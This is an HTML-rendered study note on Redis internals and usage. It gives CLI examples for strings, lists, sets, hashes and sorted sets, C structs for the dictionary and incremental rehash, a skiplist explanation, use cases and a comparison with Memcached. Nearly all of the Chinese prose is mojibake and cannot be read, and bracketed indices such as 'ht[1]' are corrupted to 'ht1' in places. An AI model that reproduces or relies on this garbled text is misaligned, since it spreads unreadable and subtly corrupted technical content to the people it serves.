<div><pre><code>REDIS_ENCODING_INTï¼ˆ<span>long</span> ç±»å‹çš„æ•´æ•°ï¼‰
REDIS_ENCODING_EMBSTR embstr ï¼ˆç¼–ç çš„ç®€å•åŠ¨æ€å­—ç¬¦ä¸²ï¼‰
REDIS_ENCODING_RAW ï¼ˆç®€å•åŠ¨æ€å­—ç¬¦ä¸²ï¼‰
REDIS_ENCODING_HT ï¼ˆå­—å…¸ï¼‰
REDIS_ENCODING_LINKEDLIST ï¼ˆåŒç«¯é“¾è¡¨ï¼‰
REDIS_ENCODING_ZIPLIST ï¼ˆå‹ç¼©åˆ—è¡¨ï¼‰
REDIS_ENCODING_INTSET ï¼ˆæ•´æ•°é›†åˆï¼‰
REDIS_ENCODING_SKIPLIST ï¼ˆè·³è·ƒè¡¨å’Œå­—å…¸ï¼‰
</code></pre></div><h2 id="string" tabindex="-1"> STRING</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6019b2db-bc3e-4408-b6d8-96025f4481d6.png" width="400"/> </div><br>
<div><pre><code>> set hello world
OK
> get hello
"world"
> del hello
(integer) 1
> get hello
(nil)
</code></pre></div><h3 id="æ•°æ®ç»“æ„å®ç°" tabindex="-1"> æ•°æ®ç»“æ„å®ç°</h3>
<ul>
<li>intï¼š8ä¸ªå­—èŠ‚çš„é•¿æ•´å‹</li>
<li>embstrï¼šå°äºç­‰äº39ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²</li>
<li>rawï¼šå¤§äº39ä¸ªå­—èŠ‚çš„å­—ç¬¦ä¸²</li>
</ul>
<h2 id="list" tabindex="-1"> LIST</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fb327611-7e2b-4f2f-9f5b-38592d408f07.png" width="400"/> </div><br>
<div><pre><code>> rpush list-key item
(integer) 1
> rpush list-key item2
(integer) 2
> rpush list-key item
(integer) 3

> lrange list-key 0 -1
1) "item"
2) "item2"
3) "item"

> lindex list-key 1
"item2"

> lpop list-key
"item"

> lrange list-key 0 -1
1) "item2"
2) "item"
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><h3 id="æ•°æ®ç»“æ„å®ç°-1" tabindex="-1"> æ•°æ®ç»“æ„å®ç°</h3>
<ul>
<li>ziplist:
<ul>
<li>åˆ—è¡¨å¯¹è±¡ä¿å­˜çš„æ‰€æœ‰å­—ç¬¦ä¸²å…ƒç´ çš„é•¿åº¦éƒ½å°äº64å­—èŠ‚ï¼›</li>
<li>åˆ—è¡¨å…ƒç´ ä¿å­˜çš„å…ƒç´ æ•°é‡å°äº512ä¸ªï¼›</li>
</ul>
</li>
<li>linkedlist</li>
</ul>
<h2 id="set" tabindex="-1"> SET</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cd5fbcff-3f35-43a6-8ffa-082a93ce0f0e.png" width="400"/> </div><br>
<div><pre><code>> sadd set-key item
(integer) 1
> sadd set-key item2
(integer) 1
> sadd set-key item3
(integer) 1
> sadd set-key item
(integer) 0

> smembers set-key
1) "item"
2) "item2"
3) "item3"

> sismember set-key item4
(integer) 0
> sismember set-key item
(integer) 1

> srem set-key item2
(integer) 1
> srem set-key item2
(integer) 0

> smembers set-key
1) "item"
2) "item3"
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><h3 id="æ•°æ®ç»“æ„å®ç°-2" tabindex="-1"> æ•°æ®ç»“æ„å®ç°</h3>
<ul>
<li>intset
<ul>
<li>é›†åˆå¯¹è±¡ä¿å­˜çš„æ‰€æœ‰å…ƒç´ éƒ½æ˜¯æ•´æ•°å€¼ï¼›</li>
<li>é›†åˆå¯¹è±¡ä¿å­˜çš„å…ƒç´ æ•°é‡ä¸è¶…è¿‡ 512 ä¸ªï¼›</li>
</ul>
</li>
<li>hashtable</li>
</ul>
<h2 id="hash" tabindex="-1"> HASH</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7bd202a7-93d4-4f3a-a878-af68ae25539a.png" width="400"/> </div><br>
<div><pre><code>> hset hash-key sub-key1 value1
(integer) 1
> hset hash-key sub-key2 value2
(integer) 1
> hset hash-key sub-key1 value1
(integer) 0

> hgetall hash-key
1) "sub-key1"
2) "value1"
3) "sub-key2"
4) "value2"

> hdel hash-key sub-key2
(integer) 1
> hdel hash-key sub-key2
(integer) 0

> hget hash-key sub-key1
"value1"

> hgetall hash-key
1) "sub-key1"
2) "value1"
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><h3 id="æ•°æ®ç»“æ„å®ç°-3" tabindex="-1"> æ•°æ®ç»“æ„å®ç°</h3>
<ul>
<li>ziplist:
<ul>
<li>å“ˆå¸Œå¯¹è±¡ä¿å­˜çš„æ‰€æœ‰é”®å€¼å¯¹çš„é”®å’Œå€¼çš„å­—ç¬¦ä¸²é•¿åº¦éƒ½å°äº 64 å­—èŠ‚ï¼›</li>
<li>å“ˆå¸Œå¯¹è±¡ä¿å­˜çš„é”®å€¼å¯¹æ•°é‡å°äº 512 ä¸ªï¼›</li>
</ul>
</li>
<li>hashtable</li>
</ul>
<h4 id="å­—å…¸" tabindex="-1"> å­—å…¸</h4>
<p>dictht æ˜¯ä¸€ä¸ªæ•£åˆ—è¡¨ç»“æ„ï¼Œä½¿ç”¨æ‹‰é“¾æ³•è§£å†³å“ˆå¸Œå†²çªã€‚</p>
<div><pre><code><span>/* This is our hash table structure. Every dictionary has two of this as we
 * implement incremental rehashing, for the old to the new table. */</span>
<span>typedef</span> <span>struct</span> <span>dictht</span> <span>{</span>
    dictEntry <span>*</span><span>*</span>table<span>;</span>
    <span>unsigned</span> <span>long</span> size<span>;</span>
    <span>unsigned</span> <span>long</span> sizemask<span>;</span>
    <span>unsigned</span> <span>long</span> used<span>;</span>
<span>}</span> dictht<span>;</span>
</code></pre></div><div><pre><code><span>typedef</span> <span>struct</span> <span>dictEntry</span> <span>{</span>
    <span>void</span> <span>*</span>key<span>;</span>
    <span>union</span> <span>{</span>
        <span>void</span> <span>*</span>val<span>;</span>
        <span>uint64_t</span> u64<span>;</span>
        <span>int64_t</span> s64<span>;</span>
        <span>double</span> d<span>;</span>
    <span>}</span> v<span>;</span>
    <span>struct</span> <span>dictEntry</span> <span>*</span>next<span>;</span>
<span>}</span> dictEntry<span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><p>Redis çš„å­—å…¸ dict ä¸­åŒ…å«ä¸¤ä¸ªå“ˆå¸Œè¡¨ dicthtï¼Œè¿™æ˜¯ä¸ºäº†æ–¹ä¾¿è¿›è¡Œ rehash æ“ä½œã€‚åœ¨æ‰©å®¹æ—¶ï¼Œå°†å…¶ä¸­ä¸€ä¸ª dictht ä¸Šçš„é”®å€¼å¯¹ rehash åˆ°å¦ä¸€ä¸ª dictht ä¸Šé¢ï¼Œå®Œæˆä¹‹åé‡Šæ”¾ç©ºé—´å¹¶äº¤æ¢ä¸¤ä¸ª dictht çš„è§’è‰²ã€‚</p>
<div><pre><code><span>typedef</span> <span>struct</span> <span>dict</span> <span>{</span>
    dictType <span>*</span>type<span>;</span>
    <span>void</span> <span>*</span>privdata<span>;</span>
    dictht ht<span>[</span><span>2</span><span>]</span><span>;</span>
    <span>long</span> rehashidx<span>;</span> <span>/* rehashing not in progress if rehashidx == -1 */</span>
    <span>unsigned</span> <span>long</span> iterators<span>;</span> <span>/* number of iterators currently running */</span>
<span>}</span> dict<span>;</span>
</code></pre></div><p>rehash æ“ä½œä¸æ˜¯ä¸€æ¬¡æ€§å®Œæˆï¼Œè€Œæ˜¯é‡‡ç”¨æ¸è¿›æ–¹å¼ï¼Œè¿™æ˜¯ä¸ºäº†é¿å…ä¸€æ¬¡æ€§æ‰§è¡Œè¿‡å¤šçš„ rehash æ“ä½œç»™æœåŠ¡å™¨å¸¦æ¥è¿‡å¤§çš„è´Ÿæ‹…ã€‚</p>
<p>æ¸è¿›å¼ rehash é€šè¿‡è®°å½• dict çš„ rehashidx å®Œæˆï¼Œå®ƒä» 0 å¼€å§‹ï¼Œç„¶åæ¯æ‰§è¡Œä¸€æ¬¡ rehash éƒ½ä¼šé€’å¢ã€‚ä¾‹å¦‚åœ¨ä¸€æ¬¡ rehash ä¸­ï¼Œè¦æŠŠ dict[0] rehash åˆ° dict[1]ï¼Œè¿™ä¸€æ¬¡ä¼šæŠŠ dict[0] ä¸Š table[rehashidx] çš„é”®å€¼å¯¹ rehash åˆ° dict[1] ä¸Šï¼Œdict[0] çš„ table[rehashidx] æŒ‡å‘ nullï¼Œå¹¶ä»¤ rehashidx++ã€‚</p>
<p>å› ä¸ºåœ¨è¿›è¡Œæ¸è¿›å¼ rehash çš„è¿‡ç¨‹ä¸­ï¼Œ å­—å…¸ä¼šåŒæ—¶ä½¿ç”¨ ht[0] å’Œ ht1 ä¸¤ä¸ªå“ˆå¸Œè¡¨ï¼Œ æ‰€ä»¥åœ¨æ¸è¿›å¼ rehash è¿›è¡ŒæœŸé—´ï¼Œ å­—å…¸çš„åˆ é™¤ï¼ˆdeleteï¼‰ã€æŸ¥æ‰¾ï¼ˆfindï¼‰ã€æ›´æ–°ï¼ˆupdateï¼‰ç­‰æ“ä½œä¼šåœ¨ä¸¤ä¸ªå“ˆå¸Œè¡¨ä¸Šè¿›è¡Œï¼š æ¯”å¦‚è¯´ï¼Œ è¦åœ¨å­—å…¸é‡Œé¢æŸ¥æ‰¾ä¸€ä¸ªé”®çš„è¯ï¼Œ ç¨‹åºä¼šå…ˆåœ¨ ht[0] é‡Œé¢è¿›è¡ŒæŸ¥æ‰¾ï¼Œ å¦‚æœæ²¡æ‰¾åˆ°çš„è¯ï¼Œ å°±ä¼šç»§ç»­åˆ° ht1 é‡Œé¢è¿›è¡ŒæŸ¥æ‰¾ï¼Œ è¯¸å¦‚æ­¤ç±»ã€‚</p>
<p>å¦å¤–ï¼Œ åœ¨æ¸è¿›å¼ rehash æ‰§è¡ŒæœŸé—´ï¼Œ æ–°æ·»åŠ åˆ°å­—å…¸çš„é”®å€¼å¯¹ä¸€å¾‹ä¼šè¢«ä¿å­˜åˆ° ht1 é‡Œé¢ï¼Œ è€Œ ht[0] åˆ™ä¸å†è¿›è¡Œä»»ä½•æ·»åŠ æ“ä½œï¼š è¿™ä¸€æªæ–½ä¿è¯äº† ht[0] åŒ…å«çš„é”®å€¼å¯¹æ•°é‡ä¼šåªå‡ä¸å¢ï¼Œ å¹¶éšç€ rehash æ“ä½œçš„æ‰§è¡Œè€Œæœ€ç»ˆå˜æˆç©ºè¡¨ã€‚</p>
<p>è¦ç‚¹</p>
<ul>
<li>å­—å…¸ä½¿ç”¨å“ˆå¸Œè¡¨ä½œä¸ºåº•å±‚å®ç°ï¼Œ æ¯ä¸ªå­—å…¸å¸¦æœ‰ä¸¤ä¸ªå“ˆå¸Œè¡¨ï¼Œ ä¸€ä¸ªç”¨äºå¹³æ—¶ä½¿ç”¨ï¼Œ å¦ä¸€ä¸ªä»…åœ¨è¿›è¡Œ rehash æ—¶ä½¿ç”¨</li>
<li>å½“å“ˆå¸Œè¡¨ä¿å­˜çš„é”®å€¼å¯¹æ•°é‡å¤ªå¤šæˆ–è€…å¤ªå°‘æ—¶ï¼Œ ç¨‹åºéœ€è¦å¯¹å“ˆå¸Œè¡¨çš„å¤§å°è¿›è¡Œç›¸åº”çš„æ‰©å±•æˆ–è€…æ”¶ç¼©ï¼ˆrehashï¼‰</li>
<li>rehash åŠ¨ä½œå¹¶ä¸æ˜¯ä¸€æ¬¡æ€§ã€é›†ä¸­å¼åœ°å®Œæˆçš„ï¼Œ è€Œæ˜¯åˆ†å¤šæ¬¡ã€æ¸è¿›å¼åœ°å®Œæˆçš„</li>
<li>æ¸è¿›å¼ rehash çš„è¿‡ç¨‹ä¸­ï¼Œ å­—å…¸ä¼šåŒæ—¶ä½¿ç”¨ ht[0] å’Œ ht[1] ä¸¤ä¸ªå“ˆå¸Œè¡¨</li>
</ul>
<h2 id="zset" tabindex="-1"> ZSET</h2>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1202b2d6-9469-4251-bd47-ca6034fb6116.png" width="400"/> </div><br>
<div><pre><code>> zadd zset-key 728 member1
(integer) 1
> zadd zset-key 982 member0
(integer) 1
> zadd zset-key 982 member0
(integer) 0

> zrange zset-key 0 -1 withscores
1) "member1"
2) "728"
3) "member0"
4) "982"

> zrangebyscore zset-key 0 800 withscores
1) "member1"
2) "728"

> zrem zset-key member1
(integer) 1
> zrem zset-key member1
(integer) 0

> zrange zset-key 0 -1 withscores
1) "member0"
2) "982"
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h3 id="æ•°æ®ç»“æ„å®ç°-4" tabindex="-1"> æ•°æ®ç»“æ„å®ç°</h3>
<ul>
<li>ziplist:</li>
<li>zskiplist</li>
</ul>
<h4 id="è·³è·ƒè¡¨" tabindex="-1"> è·³è·ƒè¡¨</h4>
<p>æ˜¯æœ‰åºé›†åˆçš„åº•å±‚å®ç°ä¹‹ä¸€ã€‚</p>
<p>è·³è·ƒè¡¨æ˜¯åŸºäºå¤šæŒ‡é’ˆæœ‰åºé“¾è¡¨å®ç°çš„ï¼Œå¯ä»¥çœ‹æˆå¤šä¸ªæœ‰åºé“¾è¡¨ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/beba612e-dc5b-4fc2-869d-0b23408ac90a.png" width="600px"/> </div><br>
<p>åœ¨æŸ¥æ‰¾æ—¶ï¼Œä»ä¸Šå±‚æŒ‡é’ˆå¼€å§‹æŸ¥æ‰¾ï¼Œæ‰¾åˆ°å¯¹åº”çš„åŒºé—´ä¹‹åå†åˆ°ä¸‹ä¸€å±‚å»æŸ¥æ‰¾ã€‚ä¸‹å›¾æ¼”ç¤ºäº†æŸ¥æ‰¾ 22 çš„è¿‡ç¨‹ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0ea37ee2-c224-4c79-b895-e131c6805c40.png" width="600px"/> </div><br>
<p>ä¸çº¢é»‘æ ‘ç­‰å¹³è¡¡æ ‘ç›¸æ¯”ï¼Œè·³è·ƒè¡¨å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p>
<ul>
<li>æ’å…¥é€Ÿåº¦éå¸¸å¿«é€Ÿï¼Œå› ä¸ºä¸éœ€è¦è¿›è¡Œæ—‹è½¬ç­‰æ“ä½œæ¥ç»´æŠ¤å¹³è¡¡æ€§ï¼›</li>
<li>æ›´å®¹æ˜“å®ç°ï¼›</li>
<li>æ”¯æŒæ— é”æ“ä½œã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-09-01-10-39-00.png" alt="" loading="lazy"></p>
<p>å±•ç¤ºäº†ä¸€ä¸ªè·³è·ƒè¡¨ç¤ºä¾‹ï¼Œ ä½äºå›¾ç‰‡æœ€å·¦è¾¹çš„æ˜¯ zskiplist ç»“æ„ï¼Œ è¯¥ç»“æ„åŒ…å«ä»¥ä¸‹å±æ€§ï¼š</p>
<blockquote></blockquote>
<ul>
<li>header ï¼šæŒ‡å‘è·³è·ƒè¡¨çš„è¡¨å¤´èŠ‚ç‚¹ã€‚</li>
<li>tail ï¼šæŒ‡å‘è·³è·ƒè¡¨çš„è¡¨å°¾èŠ‚ç‚¹ã€‚</li>
<li>level ï¼šè®°å½•ç›®å‰è·³è·ƒè¡¨å†…ï¼Œå±‚æ•°æœ€å¤§çš„é‚£ä¸ªèŠ‚ç‚¹çš„å±‚æ•°ï¼ˆè¡¨å¤´èŠ‚ç‚¹çš„å±‚æ•°ä¸è®¡ç®—åœ¨å†…ï¼‰ã€‚</li>
<li>length ï¼šè®°å½•è·³è·ƒè¡¨çš„é•¿åº¦ï¼Œä¹Ÿå³æ˜¯ï¼Œè·³è·ƒè¡¨ç›®å‰åŒ…å«èŠ‚ç‚¹çš„æ•°é‡ï¼ˆè¡¨å¤´èŠ‚ç‚¹ä¸è®¡ç®—åœ¨å†…ï¼‰ã€‚</li>
</ul>
<p>zskiplist ç»“æ„å³è¾¹çš„æ˜¯å››ä¸ª zskiplistNode ç»“æ„ï¼Œ è¯¥ç»“æ„åŒ…å«ä»¥ä¸‹å±æ€§ï¼š</p>
<ul>
<li>å±‚ï¼ˆlevelï¼‰ï¼šèŠ‚ç‚¹ä¸­ç”¨ L1 ã€ L2 ã€ L3 ç­‰å­—æ ·æ ‡è®°èŠ‚ç‚¹çš„å„ä¸ªå±‚ï¼Œ L1 ä»£è¡¨ç¬¬ä¸€å±‚ï¼Œ L2 ä»£è¡¨ç¬¬äºŒå±‚ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ¯ä¸ªå±‚éƒ½å¸¦æœ‰ä¸¤ä¸ªå±æ€§ï¼šå‰è¿›æŒ‡é’ˆå’Œè·¨åº¦ã€‚å‰è¿›æŒ‡é’ˆç”¨äºè®¿é—®ä½äºè¡¨å°¾æ–¹å‘çš„å…¶ä»–èŠ‚ç‚¹ï¼Œè€Œè·¨åº¦åˆ™è®°å½•äº†å‰è¿›æŒ‡é’ˆæ‰€æŒ‡å‘èŠ‚ç‚¹å’Œå½“å‰èŠ‚ç‚¹çš„è·ç¦»ã€‚åœ¨ä¸Šé¢çš„å›¾ç‰‡ä¸­ï¼Œè¿çº¿ä¸Šå¸¦æœ‰æ•°å­—çš„ç®­å¤´å°±ä»£è¡¨&gt;å‰è¿›æŒ‡é’ˆï¼Œè€Œé‚£ä¸ªæ•°å­—å°±æ˜¯è·¨åº¦ã€‚å½“ç¨‹åºä»è¡¨å¤´å‘è¡¨å°¾è¿›è¡Œéå†æ—¶ï¼Œè®¿é—®ä¼šæ²¿ç€å±‚çš„å‰è¿›æŒ‡é’ˆè¿›è¡Œã€‚</li>
<li>åé€€æŒ‡é’ˆï¼ˆbackwardï¼‰ï¼šèŠ‚ç‚¹ä¸­ç”¨ BW å­—æ ·æ ‡è®°èŠ‚ç‚¹çš„åé€€æŒ‡é’ˆï¼Œå®ƒæŒ‡å‘ä½äºå½“å‰èŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ã€‚åé€€æŒ‡é’ˆåœ¨ç¨‹åºä»è¡¨å°¾å‘è¡¨å¤´éå†æ—¶ä½¿ç”¨ã€‚</li>
<li>åˆ†å€¼ï¼ˆscoreï¼‰ï¼šå„ä¸ªèŠ‚ç‚¹ä¸­çš„ 1.0 ã€ 2.0 å’Œ 3.0 æ˜¯èŠ‚ç‚¹æ‰€ä¿å­˜çš„åˆ†å€¼ã€‚åœ¨è·³è·ƒè¡¨ä¸­ï¼ŒèŠ‚ç‚¹æŒ‰å„è‡ªæ‰€ä¿å­˜çš„åˆ†å€¼ä»å°åˆ°å¤§æ’åˆ—ã€‚</li>
<li>æˆå‘˜å¯¹è±¡ï¼ˆobjï¼‰ï¼šå„ä¸ªèŠ‚ç‚¹ä¸­çš„ o1 ã€ o2 å’Œ o3 æ˜¯èŠ‚ç‚¹æ‰€ä¿å­˜çš„æˆå‘˜å¯¹è±¡ã€‚</li>
</ul>
<p>æ³¨æ„è¡¨å¤´èŠ‚ç‚¹å’Œå…¶ä»–èŠ‚ç‚¹çš„æ„é€ æ˜¯ä¸€æ ·çš„ï¼š è¡¨å¤´èŠ‚ç‚¹ä¹Ÿæœ‰åé€€æŒ‡é’ˆã€åˆ†å€¼å’Œæˆå‘˜å¯¹è±¡ï¼Œ ä¸è¿‡è¡¨å¤´èŠ‚ç‚¹çš„è¿™äº›å±æ€§éƒ½ä¸ä¼šè¢«ç”¨åˆ°ï¼Œ æ‰€ä»¥å›¾ä¸­çœç•¥äº†è¿™äº›éƒ¨åˆ†ï¼Œ åªæ˜¾ç¤ºäº†è¡¨å¤´èŠ‚ç‚¹çš„å„ä¸ªå±‚ã€‚</p>
<h1 id="ä¸‰ã€ä½¿ç”¨åœºæ™¯" tabindex="-1"> ä¸‰ã€ä½¿ç”¨åœºæ™¯</h1>
<h2 id="è®¡æ•°å™¨" tabindex="-1"> è®¡æ•°å™¨</h2>
<p>å¯ä»¥å¯¹ String è¿›è¡Œè‡ªå¢è‡ªå‡è¿ç®—ï¼Œä»è€Œå®ç°è®¡æ•°å™¨åŠŸèƒ½ã€‚</p>
<p>Redis è¿™ç§å†…å­˜å‹æ•°æ®åº“çš„è¯»å†™æ€§èƒ½éå¸¸é«˜ï¼Œå¾ˆé€‚åˆå­˜å‚¨é¢‘ç¹è¯»å†™çš„è®¡æ•°é‡ã€‚</p>
<h2 id="ç¼“å­˜" tabindex="-1"> ç¼“å­˜</h2>
<p>å°†çƒ­ç‚¹æ•°æ®æ”¾åˆ°å†…å­˜ä¸­ï¼Œè®¾ç½®å†…å­˜çš„æœ€å¤§ä½¿ç”¨é‡ä»¥åŠæ·˜æ±°ç­–ç•¥æ¥ä¿è¯ç¼“å­˜çš„å‘½ä¸­ç‡ã€‚</p>
<h2 id="æŸ¥æ‰¾è¡¨" tabindex="-1"> æŸ¥æ‰¾è¡¨</h2>
<p>ä¾‹å¦‚ DNS è®°å½•å°±å¾ˆé€‚åˆä½¿ç”¨ Redis è¿›è¡Œå­˜å‚¨ã€‚</p>
<p>æŸ¥æ‰¾è¡¨å’Œç¼“å­˜ç±»ä¼¼ï¼Œä¹Ÿæ˜¯åˆ©ç”¨äº† Redis å¿«é€Ÿçš„æŸ¥æ‰¾ç‰¹æ€§ã€‚ä½†æ˜¯æŸ¥æ‰¾è¡¨çš„å†…å®¹ä¸èƒ½å¤±æ•ˆï¼Œè€Œç¼“å­˜çš„å†…å®¹å¯ä»¥å¤±æ•ˆï¼Œå› ä¸ºç¼“å­˜ä¸ä½œä¸ºå¯é çš„æ•°æ®æ¥æºã€‚</p>
<h2 id="æ¶ˆæ¯é˜Ÿåˆ—" tabindex="-1"> æ¶ˆæ¯é˜Ÿåˆ—</h2>
<p>List æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œå¯ä»¥é€šè¿‡ lpush å’Œ rpop å†™å…¥å’Œè¯»å–æ¶ˆæ¯</p>
<p>ä¸è¿‡æœ€å¥½ä½¿ç”¨ Kafkaã€RabbitMQ ç­‰æ¶ˆæ¯ä¸­é—´ä»¶ã€‚</p>
<h2 id="ä¼šè¯ç¼“å­˜" tabindex="-1"> ä¼šè¯ç¼“å­˜</h2>
<p>å¯ä»¥ä½¿ç”¨ Redis æ¥ç»Ÿä¸€å­˜å‚¨å¤šå°åº”ç”¨æœåŠ¡å™¨çš„ä¼šè¯ä¿¡æ¯ã€‚</p>
<p>å½“åº”ç”¨æœåŠ¡å™¨ä¸å†å­˜å‚¨ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ï¼Œä¹Ÿå°±ä¸å†å…·æœ‰çŠ¶æ€ï¼Œä¸€ä¸ªç”¨æˆ·å¯ä»¥è¯·æ±‚ä»»æ„ä¸€ä¸ªåº”ç”¨æœåŠ¡å™¨ï¼Œä»è€Œæ›´å®¹æ˜“å®ç°é«˜å¯ç”¨æ€§ä»¥åŠå¯ä¼¸ç¼©æ€§ã€‚</p>
<h2 id="åˆ†å¸ƒå¼é”å®ç°" tabindex="-1"> åˆ†å¸ƒå¼é”å®ç°</h2>
<p>åœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ï¼Œæ— æ³•ä½¿ç”¨å•æœºç¯å¢ƒä¸‹çš„é”æ¥å¯¹å¤šä¸ªèŠ‚ç‚¹ä¸Šçš„è¿›ç¨‹è¿›è¡ŒåŒæ­¥ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ Redis è‡ªå¸¦çš„ SETNX å‘½ä»¤å®ç°åˆ†å¸ƒå¼é”ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å®˜æ–¹æä¾›çš„ RedLock åˆ†å¸ƒå¼é”å®ç°ã€‚</p>
<h2 id="å…¶å®ƒ" tabindex="-1"> å…¶å®ƒ</h2>
<p>Set å¯ä»¥å®ç°äº¤é›†ã€å¹¶é›†ç­‰æ“ä½œï¼Œä»è€Œå®ç°å…±åŒå¥½å‹ç­‰åŠŸèƒ½ã€‚</p>
<p>ZSet å¯ä»¥å®ç°æœ‰åºæ€§æ“ä½œï¼Œä»è€Œå®ç°æ’è¡Œæ¦œç­‰åŠŸèƒ½ã€‚</p>
<h1 id="å››ã€redis-ä¸-memcached" tabindex="-1"> å››ã€Redis ä¸ Memcached</h1>
<p>ä¸¤è€…éƒ½æ˜¯éå…³ç³»å‹å†…å­˜é”®å€¼æ•°æ®åº“ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸åŒï¼š</p>
<h2 id="æ•°æ®ç±»å‹" tabindex="-1"> æ•°æ®ç±»å‹</h2>
<p>Memcached ä»…æ”¯æŒå­—ç¬¦ä¸²ç±»å‹ï¼Œè€Œ Redis æ”¯æŒäº”ç§ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥æ›´çµæ´»åœ°è§£å†³é—®é¢˜ã€‚</p>
<h2 id="æ•°æ®æŒä¹…åŒ–" tabindex="-1"> æ•°æ®æŒä¹…åŒ–</h2>
<p>Redis æ”¯æŒä¸¤ç§æŒä¹…åŒ–ç­–ç•¥ï¼šRDB å¿«ç…§å’Œ AOF æ—¥å¿—ï¼Œè€Œ Memcached ä¸æ”¯æŒæŒä¹…åŒ–ã€‚</p>
<h2 id="åˆ†å¸ƒå¼" tabindex="-1"> åˆ†å¸ƒå¼</h2>
<p>Memcached ä¸æ”¯æŒåˆ†å¸ƒå¼ï¼Œåªèƒ½é€šè¿‡åœ¨å®¢æˆ·ç«¯ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œæ¥å®ç°åˆ†å¸ƒå¼å­˜å‚¨ï¼Œè¿™ç§æ–¹å¼åœ¨å­˜å‚¨å’ŒæŸ¥è¯¢æ—¶éƒ½éœ€è¦å…ˆåœ¨å®¢æˆ·ç«¯è®¡ç®—ä¸€æ¬¡æ•°æ®æ‰€åœ¨çš„èŠ‚ç‚¹ã€‚</p>
<p>Redis Cluster å®ç°äº†åˆ†å¸ƒå¼çš„æ”¯æŒã€‚</p>
<h2 id="å†…å­˜ç®¡ç†æœºåˆ¶" tabindex="-1"> å†…å­˜ç®¡ç†æœºåˆ¶</h2>
<ul>
<li>
<p>åœ¨ Redis ä¸­ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰æ•°æ®éƒ½ä¸€ç›´å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¯ä»¥å°†ä¸€äº›å¾ˆä¹…æ²¡ç”¨çš„ value äº¤æ¢åˆ°ç£ç›˜ï¼Œè€Œ Memcached çš„æ•°æ®åˆ™ä¼šä¸€ç›´åœ¨å†…å­˜ä¸­ã€‚</p>
</li>
<li>
<p>Memcached å°†å†…å­˜åˆ†å‰²æˆç‰¹å®šé•¿åº¦çš„å—æ¥å­˜å‚¨æ•°æ®ï¼Œä»¥å®Œå…¨è§£å†³å†…å­˜ç¢ç‰‡çš„é—®é¢˜ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼ä¼šä½¿å¾—å†…å­˜çš„åˆ©ç”¨ç‡ä¸é«˜ï¼Œä¾‹å¦‚å—çš„å¤§å°ä¸º 128 bytesï¼Œåªå­˜å‚¨ 100 bytes çš„æ•°æ®ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„ 28 bytes å°±æµªè´¹æ‰äº†ã€‚</p>
</li>
</ul>
<h1 id="äº”ã€é”®çš„è¿‡æœŸæ—¶é—´" tabindex="-1"> äº”ã€é”®çš„è¿‡æœŸæ—¶é—´</h1>
<p>Redis å¯ä»¥ä¸ºæ¯ä¸ªé”®è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå½“é”®è¿‡æœŸæ—¶ï¼Œä¼šè‡ªåŠ¨åˆ é™¤è¯¥é”®ã€‚</p>
